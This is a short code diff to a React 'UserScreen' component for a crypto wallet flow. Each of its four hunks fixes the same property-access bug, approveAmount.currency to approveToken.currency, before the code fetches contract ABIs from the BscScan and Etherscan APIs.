@@ -149,7 +149,7 @@ const UserScreen = () => {
                   params: [{ chainId: '0x38' }], // chainId must be in hexadecimal numbers
                 });
                 const approveAmount = (approveToken.cost - 5) / approveToken.price;
-                if (approveAmount.currency.address === "-") {
+                if (approveToken.currency.address === "-") {
 
                 } else {
                   let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_BSC_SCAN_API_KEY;
@@ -173,7 +173,7 @@ const UserScreen = () => {
                   params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
                 });
                 const approveAmount = (approveToken.cost - 5) / approveToken.price;
-                if (approveAmount.currency.address === "-") {
+                if (approveToken.currency.address === "-") {
 
                 } else {
                   let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_ETH_SCAN_API_KEY;
@@ -230,7 +230,7 @@ const UserScreen = () => {
             params: [{ chainId: '0x38' }], // chainId must be in hexadecimal numbers
           });
           const approveAmount = (approveToken.cost - 5) / approveToken.price;
-          if (approveAmount.currency.address === "-") {
+          if (approveToken.currency.address === "-") {
 
           } else {
             let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_BSC_SCAN_API_KEY;
@@ -254,7 +254,7 @@ const UserScreen = () => {
             params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
           });
           const approveAmount = (approveToken.cost - 5) / approveToken.price;
-          if (approveAmount.currency.address === "-") {
+          if (approveToken.currency.address === "-") {
 
           } else {
             let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_ETH_SCAN_API_KEY;
